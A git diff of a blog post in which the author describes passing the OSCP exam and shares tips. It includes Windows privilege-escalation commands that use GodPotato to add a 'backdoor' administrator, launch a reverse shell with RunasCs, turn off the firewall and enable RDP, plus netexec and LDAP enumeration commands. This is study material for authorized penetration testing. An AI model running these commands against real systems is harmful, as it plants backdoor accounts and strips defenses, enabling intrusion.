@@ -1,8 +1,17 @@
 ---
 title: How I Passed the OSCP
 date: 2024-09-18T18:38:38.550Z
-lastmod: 2024-09-19T05:26:36.691Z
+lastmod: 2024-09-19T06:40:17.022Z
+toc: true
+image: "https://amirr0r.github.io/assets/img/oscp/offsec-black.png"
+featured: true
+tags:
+    - OSCP
+    - Offsec
+    - Penetration Testing
+
 ---
+
 I passed the OSCP just six months into my cybersecurity journey, despite having limited prior experience.\
 Before this, I had mainly worked with MERN Stack Web Development and experimented with Arch Linux and was fully immersed in all things Linux.
 
@@ -65,11 +74,13 @@ OSCP A,B and C were exam-like and had 3 machines for AD network and 3 standalone
 
 # Tips & Tricks
 
+The main tip I would like to give is anything you find even slightly suspicious search about it on [HackTricks](https://book.hacktricks.xyz/). It is a great resource and helped me immensely to pass the exam.
+
 ## Windows Privilege Escalation
 
 So listen closely as you will not find this information **anywhere**.
 
-Sometimes you will have SeImpersonatePrivilege and when you use your usual potato attacks like Juicy Potato or PrintSpooler IT WILL FAIL. This is where [Godpotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) comes in which has worked for me always.\
+Sometimes you will have **SeImpersonatePrivilege** and when you use your usual potato attacks like *Juicy Potato* or *PrintSpooler* IT WILL FAIL. This is where [Godpotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20) comes in which has worked for me always.\
 I use msfvenom to create a payload and execute as nt authority
 
 ```powershell
@@ -82,14 +93,14 @@ Sometimes the SeImpersonatePrivilege is not the actual intended path so the Godp
 
 Now the trick is to add an Administratror user using Godpotato.
 
-```
+```powershell
 GodPotato -cmd "net user /add backdoor Password123"
 GodPotato -cmd "net localgroup administrators /add backdoor"
 ```
 
 Now to get a shell use RunasCs.exe
 
-```
+```powershell
 RunasCs.exe backdoor Password123 "C:/Users/Public/reverse.exe" --force-profile --logon-type 8
 ```
 
@@ -97,7 +108,7 @@ This will give us a proper shell.
 
 We can also open the RDP port and login using RDP. Run this as Administrator:
 
-```cmd
+```powershell
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0 /f
 
 netsh advfirewall set allprofiles state off
@@ -109,13 +120,13 @@ Now you RDP using backdoor user.
 
 This can also be done using netexec:
 
-```
+```bash
 nxc smb <ip> -u backdoor -p Password123 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
 ```
 
 One liner to add a user and enable rdp:
 
-```
+```powershell
 net user hacker Hacker123456@ /add & net localgroup administrators hacker /add & net localgroup "Remote Desktop Users" hacker /add & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f & netsh firewall add portopening TCP 3389 "Remote Desktop" & netsh firewall set service remoteadmin enable
 ```
 
@@ -127,6 +138,19 @@ Pspy can check for programs or scripts that are running at regular intervals.
 
 ![How I Passed the OSCP.png](/postimgs/Images/How%20I%20Passed%20the%20OSCP.png)\
 In this example we could check if we have write access on the script or if the script uses something like tar with `*` which could open up possibilities of the wildcard privesc path.
+
+The other tool I use is [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration). This sometimes catches SUIDs that I might have missed in linpeas and sometimes highlights information better than linpeas.
+
+For linux always check `/opt` and check if you belong in any [interesting groups](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe).
+
+## Active Directory
+
+I will give the general outline:
+
+* Get users:
+  ```bash
+  nxc ldap <ip> -u '' -p '' --query "(objectClass=*)" "*"
+  ```
 
 ## Reverse Shells
 
